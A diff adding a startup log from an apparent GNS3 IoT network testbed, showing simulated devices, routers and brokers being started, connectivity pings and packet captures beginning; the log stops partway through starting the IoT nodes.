@@ -1,0 +1,1045 @@
+./launch.sh: line 2: venv_gotham/bin/activate: No such file or directory
+/home/mpoisson/Manuel/gotham-iot-testbed/src/gns3utils.py:65: RuntimeWarning: The maximum number of open file descriptors for the current process is set to 1024.
+This limit might not be enough to run multiple devices in GNS3 (approx more than 150 docker devices, may vary).
+To increase the limit, edit '/etc/security/limits.conf' and append: 
+*                hard    nofile          65536
+*                soft    nofile          65536
+
+  warnings.warn(msg, RuntimeWarning)
+No gns3 config file found at /home/mpoisson/.config/GNS3/2.2/gns3_server.conf. Could not check if KVM is enabled.
+(if KVM is not enabled): Enable KVM for better performance.
+No gns3 config file found at /home/mpoisson/.config/GNS3/2.2/gns3_server.conf use default server config:
+ ('localhost', 3080, False, '', '')
+Project 240311_1043_fast_big_attack exists.  ProjectNamedtuple(name='240311_1043_fast_big_attack', id='2b3d57e2-44fc-407d-9fef-29e4de394f44', grid_unit=75, gns3fy_proj=Project(name='240311_1043_fast_big_attack', project_id='2b3d57e2-44fc-407d-9fef-29e4de394f44', status='opened', path='/home/mpoisson/GNS3/projects/2b3d57e2-44fc-407d-9fef-29e4de394f44', filename='240311_1043_fast_big_attack.gns3', auto_start=False, auto_close=True, auto_open=False, drawing_grid_size=25, grid_size=75, scene_height=5000, scene_width=7500, show_grid=True, show_interface_labels=False, show_layers=False, snap_to_grid=False, supplier=None, variables=None, zoom=15, stats={'drawings': 32, 'links': 147, 'nodes': 147, 'snapshots': 0}, snapshots=None, drawings=[{'drawing_id': '2411fec3-a26f-4853-8497-9bbf5a7d974e', 'locked': False, 'project_id': '2b3d57e2-44fc-407d-9fef-29e4de394f44', 'rotation': 0, 'svg': '<svg><text font-family="monospace" font-size="12">Start addr: 192.168.19.10/255.255.255.0</text></svg>', 'x': 1337, 'y': -740, 'z': 2}, {'drawing_id': 'c6b4eca7-2d30-41c4-9c46-8afd1d9c9f68', 'locked': False, 'project_id': '2b3d57e2-44fc-407d-9fef-29e4de394f44', 'rotation': 0, 'svg': '<svg><text font-family="monospace" font-size="12">End addr  : 192.168.19.24/255.255.255.0</text></svg>', 'x': 1337, 'y': -725, 'z': 2}, {'drawing_id': '93d30696-85fd-4c41-a457-c1d9b489bdb2', 'locked': False, 'project_id': '2b3d57e2-44fc-407d-9fef-29e4de394f44', 'rotation': 0, 'svg': '<svg><text font-family="monospace" font-size="12">Gateway   : 192.168.19.1</text></svg>', 'x': 1337, 'y': -710, 'z': 2}, {'drawing_id': 'eda6e5e1-f846-4eaa-8b8c-f79a76533753', 'locked': False, 'project_id': '2b3d57e2-44fc-407d-9fef-29e4de394f44', 'rotation': 0, 'svg': '<svg><text font-family="monospace" font-size="12">Nameserver: 192.168.0.2</text></svg>', 'x': 1337, 'y': -695, 'z': 2}, {'drawing_id': 'ad822856-3fca-4467-9f1f-043eda13689a', 'locked': False, 'project_id': '2b3d57e2-44fc-407d-9fef-29e4de394f44', 'rotation': 0, 'svg': '<svg><text font-family="monospace" font-size="12">Start addr: 192.168.19.25/255.255.255.0</text></svg>', 'x': 2087, 'y': -740, 'z': 2}, {'drawing_id': '67e9aab3-0e15-4138-a92a-934b8cb9338d', 'locked': False, 'project_id': '2b3d57e2-44fc-407d-9fef-29e4de394f44', 'rotation': 0, 'svg': '<svg><text font-family="monospace" font-size="12">End addr  : 192.168.19.39/255.255.255.0</text></svg>', 'x': 2087, 'y': -725, 'z': 2}, {'drawing_id': '66b2057c-5d1c-4ed6-bcc0-f3ff4eaa3eab', 'locked': False, 'project_id': '2b3d57e2-44fc-407d-9fef-29e4de394f44', 'rotation': 0, 'svg': '<svg><text font-family="monospace" font-size="12">Gateway   : 192.168.19.1</text></svg>', 'x': 2087, 'y': -710, 'z': 2}, {'drawing_id': 'db7f4e6b-ae44-4d8f-a1cb-dd3e73e3db3c', 'locked': False, 'project_id': '2b3d57e2-44fc-407d-9fef-29e4de394f44', 'rotation': 0, 'svg': '<svg><text font-family="monospace" font-size="12">Nameserver: 192.168.0.2</text></svg>', 'x': 2087, 'y': -695, 'z': 2}, {'drawing_id': '0fa8e4fa-3db9-47a5-9f50-16946ec5d65e', 'locked': False, 'project_id': '2b3d57e2-44fc-407d-9fef-29e4de394f44', 'rotation': 0, 'svg': '<svg><text font-family="monospace" font-size="12">Start addr: 192.168.19.40/255.255.255.0</text></svg>', 'x': 2087, 'y': -590, 'z': 2}, {'drawing_id': '5baf8ecf-93a2-4120-ae7b-0dbc018b82ac', 'locked': False, 'project_id': '2b3d57e2-44fc-407d-9fef-29e4de394f44', 'rotation': 0, 'svg': '<svg><text font-family="monospace" font-size="12">End addr  : 192.168.19.54/255.255.255.0</text></svg>', 'x': 2087, 'y': -575, 'z': 2}, {'drawing_id': '2e505ede-1b22-42bc-ac7f-83454c005d9a', 'locked': False, 'project_id': '2b3d57e2-44fc-407d-9fef-29e4de394f44', 'rotation': 0, 'svg': '<svg><text font-family="monospace" font-size="12">Gateway   : 192.168.19.1</text></svg>', 'x': 2087, 'y': -560, 'z': 2}, {'drawing_id': 'feea55f0-ff53-4def-bd35-e261216bb57f', 'locked': False, 'project_id': '2b3d57e2-44fc-407d-9fef-29e4de394f44', 'rotation': 0, 'svg': '<svg><text font-family="monospace" font-size="12">Nameserver: 192.168.0.2</text></svg>', 'x': 2087, 'y': -545, 'z': 2}, {'drawing_id': '59cbeb4d-a0a4-4e30-a0b3-9f1c8f563ae4', 'locked': False, 'project_id': '2b3d57e2-44fc-407d-9fef-29e4de394f44', 'rotation': 0, 'svg': '<svg><text font-family="monospace" font-size="12">Start addr: 192.168.19.55/255.255.255.0</text></svg>', 'x': 1337, 'y': -515, 'z': 2}, {'drawing_id': 'ffe5acbe-ba9f-47f9-bcd4-9a29c1b434cc', 'locked': False, 'project_id': '2b3d57e2-44fc-407d-9fef-29e4de394f44', 'rotation': 0, 'svg': '<svg><text font-family="monospace" font-size="12">End addr  : 192.168.19.64/255.255.255.0</text></svg>', 'x': 1337, 'y': -500, 'z': 2}, {'drawing_id': '98f7a1ef-57f7-4f58-9439-b6abf177504e', 'locked': False, 'project_id': '2b3d57e2-44fc-407d-9fef-29e4de394f44', 'rotation': 0, 'svg': '<svg><text font-family="monospace" font-size="12">Gateway   : 192.168.19.1</text></svg>', 'x': 1337, 'y': -485, 'z': 2}, {'drawing_id': 'c3a6b5c4-bddb-411a-9015-c5999030d3d3', 'locked': False, 'project_id': '2b3d57e2-44fc-407d-9fef-29e4de394f44', 'rotation': 0, 'svg': '<svg><text font-family="monospace" font-size="12">Nameserver: 192.168.0.2</text></svg>', 'x': 1337, 'y': -470, 'z': 2}, {'drawing_id': 'ef242880-1454-4ad5-a1f3-1d9ca23a7747', 'locked': False, 'project_id': '2b3d57e2-44fc-407d-9fef-29e4de394f44', 'rotation': 0, 'svg': '<svg><text font-family="monospace" font-size="12">Start addr: 192.168.19.65/255.255.255.0</text></svg>', 'x': 2087, 'y': 10, 'z': 2}, {'drawing_id': 'adc53ee6-34d3-43e8-9a1d-5f6a8aff701f', 'locked': False, 'project_id': '2b3d57e2-44fc-407d-9fef-29e4de394f44', 'rotation': 0, 'svg': '<svg><text font-family="monospace" font-size="12">End addr  : 192.168.19.79/255.255.255.0</text></svg>', 'x': 2087, 'y': 25, 'z': 2}, {'drawing_id': '698d128d-18e9-4384-a2a6-abaf46bab610', 'locked': False, 'project_id': '2b3d57e2-44fc-407d-9fef-29e4de394f44', 'rotation': 0, 'svg': '<svg><text font-family="monospace" font-size="12">Gateway   : 192.168.19.1</text></svg>', 'x': 2087, 'y': 40, 'z': 2}, {'drawing_id': '488bd1e0-4b96-4298-bd0d-5f05be935f2f', 'locked': False, 'project_id': '2b3d57e2-44fc-407d-9fef-29e4de394f44', 'rotation': 0, 'svg': '<svg><text font-family="monospace" font-size="12">Nameserver: 192.168.0.2</text></svg>', 'x': 2087, 'y': 55, 'z': 2}, {'drawing_id': '29116fdd-7fd5-4cb4-a37d-734d4d542497', 'locked': False, 'project_id': '2b3d57e2-44fc-407d-9fef-29e4de394f44', 'rotation': 0, 'svg': '<svg><text font-family="monospace" font-size="12">Start addr: 192.168.19.80/255.255.255.0</text></svg>', 'x': 2087, 'y': 535, 'z': 2}, {'drawing_id': '98ba3b1d-f6c8-4262-a6c0-acfdfa3e238a', 'locked': False, 'project_id': '2b3d57e2-44fc-407d-9fef-29e4de394f44', 'rotation': 0, 'svg': '<svg><text font-family="monospace" font-size="12">End addr  : 192.168.19.94/255.255.255.0</text></svg>', 'x': 2087, 'y': 550, 'z': 2}, {'drawing_id': '11585d97-4621-4bea-82e0-9a49aeb0347f', 'locked': False, 'project_id': '2b3d57e2-44fc-407d-9fef-29e4de394f44', 'rotation': 0, 'svg': '<svg><text font-family="monospace" font-size="12">Gateway   : 192.168.19.1</text></svg>', 'x': 2087, 'y': 565, 'z': 2}, {'drawing_id': '63984c47-4b41-4f1c-ac05-7b03045d234f', 'locked': False, 'project_id': '2b3d57e2-44fc-407d-9fef-29e4de394f44', 'rotation': 0, 'svg': '<svg><text font-family="monospace" font-size="12">Nameserver: 192.168.0.2</text></svg>', 'x': 2087, 'y': 580, 'z': 2}, {'drawing_id': '3bfd75b0-bcf2-4b76-bd9c-1c7d9823d935', 'locked': False, 'project_id': '2b3d57e2-44fc-407d-9fef-29e4de394f44', 'rotation': 0, 'svg': '<svg><text font-family="monospace" font-size="12">Start addr: 192.168.18.10/255.255.255.0</text></svg>', 'x': -87, 'y': -740, 'z': 2}, {'drawing_id': '71658575-c37b-45f1-bcd1-05df2e6559a0', 'locked': False, 'project_id': '2b3d57e2-44fc-407d-9fef-29e4de394f44', 'rotation': 0, 'svg': '<svg><text font-family="monospace" font-size="12">End addr  : 192.168.18.24/255.255.255.0</text></svg>', 'x': -87, 'y': -725, 'z': 2}, {'drawing_id': '2aa5eee0-4074-4224-9476-a6f70a4a9c8b', 'locked': False, 'project_id': '2b3d57e2-44fc-407d-9fef-29e4de394f44', 'rotation': 0, 'svg': '<svg><text font-family="monospace" font-size="12">Gateway   : 192.168.18.1</text></svg>', 'x': -87, 'y': -710, 'z': 2}, {'drawing_id': 'b67a5b50-0069-4778-97e3-c32ec5204ed9', 'locked': False, 'project_id': '2b3d57e2-44fc-407d-9fef-29e4de394f44', 'rotation': 0, 'svg': '<svg><text font-family="monospace" font-size="12">Nameserver: 192.168.0.2</text></svg>', 'x': -87, 'y': -695, 'z': 2}, {'drawing_id': 'd1a8bd6f-dc9c-4e21-9756-7b3ae13c1175', 'locked': False, 'project_id': '2b3d57e2-44fc-407d-9fef-29e4de394f44', 'rotation': 0, 'svg': '<svg><text font-family="monospace" font-size="12">Start addr: 192.168.18.25/255.255.255.0</text></svg>', 'x': -87, 'y': -590, 'z': 2}, {'drawing_id': '231f69cd-85d2-458e-a615-e914e4b3e6de', 'locked': False, 'project_id': '2b3d57e2-44fc-407d-9fef-29e4de394f44', 'rotation': 0, 'svg': '<svg><text font-family="monospace" font-size="12">End addr  : 192.168.18.39/255.255.255.0</text></svg>', 'x': -87, 'y': -575, 'z': 2}, {'drawing_id': '4e8f2db5-ea8c-4ca8-909d-172ea5d639f5', 'locked': False, 'project_id': '2b3d57e2-44fc-407d-9fef-29e4de394f44', 'rotation': 0, 'svg': '<svg><text font-family="monospace" font-size="12">Gateway   : 192.168.18.1</text></svg>', 'x': -87, 'y': -560, 'z': 2}, {'drawing_id': 'b40af94a-8c0f-426d-8ca9-e2d76178aaf0', 'locked': False, 'project_id': '2b3d57e2-44fc-407d-9fef-29e4de394f44', 'rotation': 0, 'svg': '<svg><text font-family="monospace" font-size="12">Nameserver: 192.168.0.2</text></svg>', 'x': -87, 'y': -545, 'z': 2}]))
+Project 240311_1043_fast_big_attack is already open.
+[check_ip] Ignoring  VyOS1.3.0-1:	404 Not Found /etc/network/interfaces
+[check_ip] Ignoring  VyOS1.3.0-2:	404 Not Found /etc/network/interfaces
+[check_ip] Ignoring  VyOS1.3.0-3:	404 Not Found /etc/network/interfaces
+[check_ip] Searching OpenvSwitch-1:	No matches
+[check_ip] Searching OpenvSwitch-2:	No matches
+[check_ip] Searching OpenvSwitch-3:	No matches
+[check_ip] Ignoring  VyOS1.3.0-5:	404 Not Found /etc/network/interfaces
+[check_ip] Searching OpenvSwitch-4:	No matches
+[check_ip] Ignoring  VyOS1.3.0-6:	404 Not Found /etc/network/interfaces
+[check_ip] Searching OpenvSwitch-5:	No matches
+[check_ip] Ignoring  VyOS1.3.0-10:	404 Not Found /etc/network/interfaces
+[check_ip] Searching OpenvSwitch-6:	No matches
+[check_ip] Searching OpenvSwitch-7:	No matches
+[check_ip] Searching iotsim-dns-1:	192.168.0.2
+[check_ip] Searching iotsim-ntp-1:	192.168.0.3
+[check_ip] Searching iotsim-mqtt-broker-tls-1:	192.168.0.4
+[check_ip] Searching OpenvSwitch-8:	No matches
+[check_ip] Searching iotsim-mqtt-broker-1.6-auth-1:	192.168.3.1
+[check_ip] Searching OpenvSwitch-9:	No matches
+[check_ip] Searching iotsim-cooler-motor-1:	192.168.19.10
+[check_ip] Searching iotsim-cooler-motor-2:	192.168.19.11
+[check_ip] Searching iotsim-cooler-motor-3:	192.168.19.12
+[check_ip] Searching iotsim-cooler-motor-4:	192.168.19.13
+[check_ip] Searching iotsim-cooler-motor-5:	192.168.19.14
+[check_ip] Searching iotsim-cooler-motor-6:	192.168.19.15
+[check_ip] Searching iotsim-cooler-motor-7:	192.168.19.16
+[check_ip] Searching iotsim-cooler-motor-8:	192.168.19.17
+[check_ip] Searching iotsim-cooler-motor-9:	192.168.19.18
+[check_ip] Searching iotsim-cooler-motor-10:	192.168.19.19
+[check_ip] Searching iotsim-cooler-motor-11:	192.168.19.20
+[check_ip] Searching iotsim-cooler-motor-12:	192.168.19.21
+[check_ip] Searching iotsim-cooler-motor-13:	192.168.19.22
+[check_ip] Searching iotsim-cooler-motor-14:	192.168.19.23
+[check_ip] Searching iotsim-cooler-motor-15:	192.168.19.24
+[check_ip] Searching OpenvSwitch-10:	No matches
+[check_ip] Searching iotsim-predictive-maintenance-1:	192.168.19.25
+[check_ip] Searching iotsim-predictive-maintenance-2:	192.168.19.26
+[check_ip] Searching iotsim-predictive-maintenance-3:	192.168.19.27
+[check_ip] Searching iotsim-predictive-maintenance-4:	192.168.19.28
+[check_ip] Searching iotsim-predictive-maintenance-5:	192.168.19.29
+[check_ip] Searching iotsim-predictive-maintenance-6:	192.168.19.30
+[check_ip] Searching iotsim-predictive-maintenance-7:	192.168.19.31
+[check_ip] Searching iotsim-predictive-maintenance-8:	192.168.19.32
+[check_ip] Searching iotsim-predictive-maintenance-9:	192.168.19.33
+[check_ip] Searching iotsim-predictive-maintenance-10:	192.168.19.34
+[check_ip] Searching iotsim-predictive-maintenance-11:	192.168.19.35
+[check_ip] Searching iotsim-predictive-maintenance-12:	192.168.19.36
+[check_ip] Searching iotsim-predictive-maintenance-13:	192.168.19.37
+[check_ip] Searching iotsim-predictive-maintenance-14:	192.168.19.38
+[check_ip] Searching iotsim-predictive-maintenance-15:	192.168.19.39
+[check_ip] Searching OpenvSwitch-11:	No matches
+[check_ip] Searching iotsim-predictive-maintenance-16:	192.168.19.40
+[check_ip] Searching iotsim-predictive-maintenance-17:	192.168.19.41
+[check_ip] Searching iotsim-predictive-maintenance-18:	192.168.19.42
+[check_ip] Searching iotsim-predictive-maintenance-19:	192.168.19.43
+[check_ip] Searching iotsim-predictive-maintenance-20:	192.168.19.44
+[check_ip] Searching iotsim-predictive-maintenance-21:	192.168.19.45
+[check_ip] Searching iotsim-predictive-maintenance-22:	192.168.19.46
+[check_ip] Searching iotsim-predictive-maintenance-23:	192.168.19.47
+[check_ip] Searching iotsim-predictive-maintenance-24:	192.168.19.48
+[check_ip] Searching iotsim-predictive-maintenance-25:	192.168.19.49
+[check_ip] Searching iotsim-predictive-maintenance-26:	192.168.19.50
+[check_ip] Searching iotsim-predictive-maintenance-27:	192.168.19.51
+[check_ip] Searching iotsim-predictive-maintenance-28:	192.168.19.52
+[check_ip] Searching iotsim-predictive-maintenance-29:	192.168.19.53
+[check_ip] Searching iotsim-predictive-maintenance-30:	192.168.19.54
+[check_ip] Searching OpenvSwitch-12:	No matches
+[check_ip] Searching iotsim-cooler-motor-16:	192.168.19.55
+[check_ip] Searching iotsim-cooler-motor-17:	192.168.19.56
+[check_ip] Searching iotsim-cooler-motor-18:	192.168.19.57
+[check_ip] Searching iotsim-cooler-motor-19:	192.168.19.58
+[check_ip] Searching iotsim-cooler-motor-20:	192.168.19.59
+[check_ip] Searching iotsim-cooler-motor-21:	192.168.19.60
+[check_ip] Searching iotsim-cooler-motor-22:	192.168.19.61
+[check_ip] Searching iotsim-cooler-motor-23:	192.168.19.62
+[check_ip] Searching iotsim-cooler-motor-24:	192.168.19.63
+[check_ip] Searching iotsim-cooler-motor-25:	192.168.19.64
+[check_ip] Searching OpenvSwitch-13:	No matches
+[check_ip] Searching iotsim-predictive-maintenance-31:	192.168.19.65
+[check_ip] Searching iotsim-predictive-maintenance-32:	192.168.19.66
+[check_ip] Searching iotsim-predictive-maintenance-33:	192.168.19.67
+[check_ip] Searching iotsim-predictive-maintenance-34:	192.168.19.68
+[check_ip] Searching iotsim-predictive-maintenance-35:	192.168.19.69
+[check_ip] Searching iotsim-predictive-maintenance-36:	192.168.19.70
+[check_ip] Searching iotsim-predictive-maintenance-37:	192.168.19.71
+[check_ip] Searching iotsim-predictive-maintenance-38:	192.168.19.72
+[check_ip] Searching iotsim-predictive-maintenance-39:	192.168.19.73
+[check_ip] Searching iotsim-predictive-maintenance-40:	192.168.19.74
+[check_ip] Searching iotsim-predictive-maintenance-41:	192.168.19.75
+[check_ip] Searching iotsim-predictive-maintenance-42:	192.168.19.76
+[check_ip] Searching iotsim-predictive-maintenance-43:	192.168.19.77
+[check_ip] Searching iotsim-predictive-maintenance-44:	192.168.19.78
+[check_ip] Searching iotsim-predictive-maintenance-45:	192.168.19.79
+[check_ip] Searching OpenvSwitch-14:	No matches
+[check_ip] Searching iotsim-predictive-maintenance-46:	192.168.19.80
+[check_ip] Searching iotsim-predictive-maintenance-47:	192.168.19.81
+[check_ip] Searching iotsim-predictive-maintenance-48:	192.168.19.82
+[check_ip] Searching iotsim-predictive-maintenance-49:	192.168.19.83
+[check_ip] Searching iotsim-predictive-maintenance-50:	192.168.19.84
+[check_ip] Searching iotsim-predictive-maintenance-51:	192.168.19.85
+[check_ip] Searching iotsim-predictive-maintenance-52:	192.168.19.86
+[check_ip] Searching iotsim-predictive-maintenance-53:	192.168.19.87
+[check_ip] Searching iotsim-predictive-maintenance-54:	192.168.19.88
+[check_ip] Searching iotsim-predictive-maintenance-55:	192.168.19.89
+[check_ip] Searching iotsim-predictive-maintenance-56:	192.168.19.90
+[check_ip] Searching iotsim-predictive-maintenance-57:	192.168.19.91
+[check_ip] Searching iotsim-predictive-maintenance-58:	192.168.19.92
+[check_ip] Searching iotsim-predictive-maintenance-59:	192.168.19.93
+[check_ip] Searching iotsim-predictive-maintenance-60:	192.168.19.94
+[check_ip] Searching OpenvSwitch-15:	No matches
+[check_ip] Searching iotsim-mqtt-broker-1.6-1:	192.168.2.1
+[check_ip] Searching OpenvSwitch-16:	No matches
+[check_ip] Searching iotsim-domotic-monitor-bis-1:	192.168.18.10
+[check_ip] Searching iotsim-domotic-monitor-bis-2:	192.168.18.11
+[check_ip] Searching iotsim-domotic-monitor-bis-3:	192.168.18.12
+[check_ip] Searching iotsim-domotic-monitor-bis-4:	192.168.18.13
+[check_ip] Searching iotsim-domotic-monitor-bis-5:	192.168.18.14
+[check_ip] Searching iotsim-domotic-monitor-bis-6:	192.168.18.15
+[check_ip] Searching iotsim-domotic-monitor-bis-7:	192.168.18.16
+[check_ip] Searching iotsim-domotic-monitor-bis-8:	192.168.18.17
+[check_ip] Searching iotsim-domotic-monitor-bis-9:	192.168.18.18
+[check_ip] Searching iotsim-domotic-monitor-bis-10:	192.168.18.19
+[check_ip] Searching iotsim-domotic-monitor-bis-11:	192.168.18.20
+[check_ip] Searching iotsim-domotic-monitor-bis-12:	192.168.18.21
+[check_ip] Searching iotsim-domotic-monitor-bis-13:	192.168.18.22
+[check_ip] Searching iotsim-domotic-monitor-bis-14:	192.168.18.23
+[check_ip] Searching iotsim-domotic-monitor-bis-15:	192.168.18.24
+[check_ip] Searching OpenvSwitch-17:	No matches
+[check_ip] Searching iotsim-domotic-monitor-bis-16:	192.168.18.25
+[check_ip] Searching iotsim-domotic-monitor-bis-17:	192.168.18.26
+[check_ip] Searching iotsim-domotic-monitor-bis-18:	192.168.18.27
+[check_ip] Searching iotsim-domotic-monitor-bis-19:	192.168.18.28
+[check_ip] Searching iotsim-domotic-monitor-bis-20:	192.168.18.29
+[check_ip] Searching iotsim-domotic-monitor-bis-21:	192.168.18.30
+[check_ip] Searching iotsim-domotic-monitor-bis-22:	192.168.18.31
+[check_ip] Searching iotsim-domotic-monitor-bis-23:	192.168.18.32
+[check_ip] Searching iotsim-domotic-monitor-bis-24:	192.168.18.33
+[check_ip] Searching iotsim-domotic-monitor-bis-25:	192.168.18.34
+[check_ip] Searching iotsim-domotic-monitor-bis-26:	192.168.18.35
+[check_ip] Searching iotsim-domotic-monitor-bis-27:	192.168.18.36
+[check_ip] Searching iotsim-domotic-monitor-bis-28:	192.168.18.37
+[check_ip] Searching iotsim-domotic-monitor-bis-29:	192.168.18.38
+[check_ip] Searching iotsim-domotic-monitor-bis-30:	192.168.18.39
+[check_ip] Searching sinetstream-zookeeper-1:	192.168.15.10
+[check_ip] Searching sinetstream-kafka-broker-1:	192.168.15.11
+[check_ip] Searching sinetstream-connect-kafka-1:	192.168.15.12
+[check_ip] Searching sinetstream-client-connect-1:	192.168.15.13
+going to start 6 nodes (re.compile('vyos.*', re.IGNORECASE))
+Starting VyOS1.3.0-1... OK
+Starting VyOS1.3.0-2... OK
+Starting VyOS1.3.0-3... OK
+Starting VyOS1.3.0-5... OK
+Starting VyOS1.3.0-6... OK
+Starting VyOS1.3.0-10... OK
+going to start 17 nodes (re.compile('openvswitch.*', re.IGNORECASE))
+Starting OpenvSwitch-1... OK
+Starting OpenvSwitch-2... OK
+Starting OpenvSwitch-3... OK
+Starting OpenvSwitch-4... OK
+Starting OpenvSwitch-5... OK
+Starting OpenvSwitch-6... OK
+Starting OpenvSwitch-7... OK
+Starting OpenvSwitch-8... OK
+Starting OpenvSwitch-9... OK
+Starting OpenvSwitch-10... OK
+Starting OpenvSwitch-11... OK
+Starting OpenvSwitch-12... OK
+Starting OpenvSwitch-13... OK
+Starting OpenvSwitch-14... OK
+Starting OpenvSwitch-15... OK
+Starting OpenvSwitch-16... OK
+Starting OpenvSwitch-17... OK
+Starting iotsim-dns-1 
+Starting iotsim-ntp-1 
+Starting iotsim-mqtt-broker-tls-1 
+Starting iotsim-mqtt-broker-1.6-auth-1 
+Starting iotsim-mqtt-broker-1.6-1 
+waiting for routers to exchange neighbors routing information
+from router, try ping broker at 192.168.0.4
+router login...login successfully
+payload=b'/usr/bin/ping 192.168.0.4\n'
+ /usr/bin/ping 192.168.0.4
+router c0f4a452-1bb2-4a06-8680-27172ecd58c4 can ping address 192.168.0.4
+from router, try ping broker at 192.168.3.1
+router login...already logged in
+payload=b'/usr/bin/ping 192.168.3.1\n'
+Rloc-2:~$ /usr/bin/ping 192.168.3.1
+router c0f4a452-1bb2-4a06-8680-27172ecd58c4 can ping address 192.168.3.1
+from router, try ping broker at 192.168.2.1
+router login...already logged in
+payload=b'/usr/bin/ping 192.168.2.1\n'
+Rloc-2:~$ /usr/bin/ping 192.168.2.1
+router c0f4a452-1bb2-4a06-8680-27172ecd58c4 can ping address 192.168.2.1
+from router, try ping broker at 192.168.0.4
+router login...login successfully
+payload=b'/usr/bin/ping 192.168.0.4\n'
+ /usr/bin/ping 192.168.0.4
+router 7b9e7cba-adb3-49dd-a5ee-3bb779f490b6 can ping address 192.168.0.4
+from router, try ping broker at 192.168.3.1
+router login...already logged in
+payload=b'/usr/bin/ping 192.168.3.1\n'
+Rloc-3:~$ /usr/bin/ping 192.168.3.1
+router 7b9e7cba-adb3-49dd-a5ee-3bb779f490b6 can ping address 192.168.3.1
+from router, try ping broker at 192.168.2.1
+router login...already logged in
+payload=b'/usr/bin/ping 192.168.2.1\n'
+Rloc-3:~$ /usr/bin/ping 192.168.2.1
+router 7b9e7cba-adb3-49dd-a5ee-3bb779f490b6 can ping address 192.168.2.1
+found 1 switches
+Finding links in switch VyOS1.3.0-1... 1 links found
+	 Starting capture in link VyOS1.3.0-2 <--> VyOS1.3.0-1... Capturing True, in file GNS3/projects/2b3d57e2-44fc-407d-9fef-29e4de394f44/project-files/captures/VyOS130-1_1-0_to_VyOS130-2_1-0.pcap
+OK
+found 1 switches
+Finding links in switch sinetstream-connect-kafka-1... 1 links found
+	 Starting capture in link OpenvSwitch-15 <--> sinetstream-connect-kafka-1... Capturing True, in file GNS3/projects/2b3d57e2-44fc-407d-9fef-29e4de394f44/project-files/captures/OpenvSwitch-15_4-0_to_sinetstream-connect-kafka-1_0-0.pcap
+OK
+found 1 switches
+Finding links in switch sinetstream-zookeeper-1... 1 links found
+	 Starting capture in link OpenvSwitch-15 <--> sinetstream-zookeeper-1... Capturing True, in file GNS3/projects/2b3d57e2-44fc-407d-9fef-29e4de394f44/project-files/captures/OpenvSwitch-15_2-0_to_sinetstream-zookeeper-1_0-0.pcap
+OK
+node iotsim-predictive-maintenance-35, setting ENV... Starting node...
+log_match='[  ping   ] pinging'
+continue to next IoT device
+node iotsim-predictive-maintenance-50, setting ENV... Starting node...
+log_match='[  ping   ] pinging'
+continue to next IoT device
+node iotsim-predictive-maintenance-56, setting ENV... Starting node...
+log_match='[  ping   ] pinging'
+continue to next IoT device
+node iotsim-cooler-motor-15, setting ENV... Starting node...
+log_match='[  ping   ] pinging'
+continue to next IoT device
+node iotsim-cooler-motor-22, setting ENV... Starting node...
+log_match='[  ping   ] pinging'
+continue to next IoT device
+node iotsim-domotic-monitor-bis-26, setting ENV... Starting node...
+log_match='[  ping   ] pinging'
+continue to next IoT device
+node iotsim-predictive-maintenance-34, setting ENV... Starting node...
+log_match='[  ping   ] pinging'
+continue to next IoT device
+node iotsim-domotic-monitor-bis-13, setting ENV... Starting node...
+log_match='[  ping   ] pinging'
+continue to next IoT device
+node iotsim-predictive-maintenance-41, setting ENV... Starting node...
+log_match='[  ping   ] pinging'
+continue to next IoT device
+node iotsim-predictive-maintenance-38, setting ENV... Starting node...
+log_match='[  ping   ] pinging'
+continue to next IoT device
+node iotsim-cooler-motor-17, setting ENV... Starting node...
+log_match='[  ping   ] pinging'
+continue to next IoT device
+node iotsim-cooler-motor-14, setting ENV... Starting node...
+log_match='[  ping   ] pinging'
+continue to next IoT device
+node iotsim-domotic-monitor-bis-2, setting ENV... Starting node...
+log_match='[  ping   ] pinging'
+continue to next IoT device
+node iotsim-cooler-motor-5, setting ENV... Starting node...
+log_match='[  ping   ] pinging'
+continue to next IoT device
+node iotsim-predictive-maintenance-30, setting ENV... Starting node...
+log_match='[  ping   ] pinging'
+continue to next IoT device
+node iotsim-domotic-monitor-bis-27, setting ENV... Starting node...
+log_match='[  ping   ] pinging'
+continue to next IoT device
+node iotsim-cooler-motor-25, setting ENV... Starting node...
+log_match='[  ping   ] pinging'
+continue to next IoT device
+node iotsim-predictive-maintenance-14, setting ENV... Starting node...
+log_match='[  ping   ] pinging'
+continue to next IoT device
+node iotsim-domotic-monitor-bis-16, setting ENV... Starting node...
+log_match='[  ping   ] pinging'
+continue to next IoT device
+node iotsim-cooler-motor-23, setting ENV... Starting node...
+log_match='[  ping   ] pinging'
+continue to next IoT device
+node iotsim-predictive-maintenance-8, setting ENV... Starting node...
+log_match='[  ping   ] pinging'
+continue to next IoT device
+node iotsim-predictive-maintenance-12, setting ENV... Starting node...
+log_match='[  ping   ] pinging'
+continue to next IoT device
+node iotsim-predictive-maintenance-59, setting ENV... Starting node...
+log_match='[  ping   ] pinging'
+continue to next IoT device
+node iotsim-predictive-maintenance-6, setting ENV... Starting node...
+log_match='[  ping   ] pinging'
+continue to next IoT device
+node iotsim-predictive-maintenance-43, setting ENV... Starting node...
+log_match='[  ping   ] pinging'
+continue to next IoT device
+node iotsim-domotic-monitor-bis-30, setting ENV... Starting node...
+log_match='[  ping   ] pinging'
+continue to next IoT device
+node iotsim-domotic-monitor-bis-17, setting ENV... Starting node...
+log_match='[  ping   ] pinging'
+continue to next IoT device
+node iotsim-cooler-motor-4, setting ENV... Starting node...
+log_match='[  ping   ] pinging'
+continue to next IoT device
+node iotsim-domotic-monitor-bis-6, setting ENV... Starting node...
+log_match='[  ping   ] pinging'
+continue to next IoT device
+node iotsim-predictive-maintenance-21, setting ENV... Starting node...
+log_match='[  ping   ] pinging'
+continue to next IoT device
+node iotsim-domotic-monitor-bis-29, setting ENV... Starting node...
+log_match='[  ping   ] pinging'
+continue to next IoT device
+node iotsim-predictive-maintenance-32, setting ENV... Starting node...
+log_match='[  ping   ] pinging'
+continue to next IoT device
+node iotsim-cooler-motor-13, setting ENV... Starting node...
+log_match='[  ping   ] pinging'
+continue to next IoT device
+node iotsim-cooler-motor-18, setting ENV... Starting node...
+log_match='[  ping   ] pinging'
+continue to next IoT device
+node iotsim-predictive-maintenance-31, setting ENV... Starting node...
+log_match='[  ping   ] pinging'
+continue to next IoT device
+node iotsim-domotic-monitor-bis-9, setting ENV... Starting node...
+log_match='[  ping   ] pinging'
+continue to next IoT device
+node iotsim-cooler-motor-10, setting ENV... Starting node...
+log_match='[  ping   ] pinging'
+continue to next IoT device
+node iotsim-domotic-monitor-bis-10, setting ENV... Starting node...
+log_match='[  ping   ] pinging'
+continue to next IoT device
+node iotsim-predictive-maintenance-25, setting ENV... Starting node...
